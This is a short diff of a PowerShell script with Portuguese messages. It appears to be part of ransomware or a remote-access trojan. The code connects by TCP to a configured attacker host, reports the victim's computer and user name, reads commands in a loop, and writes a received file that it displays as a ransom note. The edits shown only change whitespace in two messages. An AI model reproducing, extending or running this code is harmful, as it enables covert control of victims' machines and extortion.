@@ -159,7 +159,7 @@ function Start-RansomNoteThread {
 try {
     $client = New-Object System.Net.Sockets.TcpClient($ip, $port)
     $stream = $client.GetStream()
-    Send-Bytes "Conectado de $env:COMPUTERNAME - $env:USERNAME"
+    Send-Bytes "Conectado de $env:COMPUTERNAME - $env:USERNAME - "
 
     while ($client.Connected) {
         $cmd = Read-Message
@@ -208,7 +208,7 @@ try {
                 $data = Read-Bytes $size
                 if ($data -eq $null) { continue }
                 [System.IO.File]::WriteAllBytes($path, $data)
-                Send-Bytes "Nota de resgate recebida. Exibindo..."
+                Send-Bytes "Nota de resgate recebida. Exibindo..."    
                 Start-RansomNoteThread -ImagePath $path
                 continue
             }
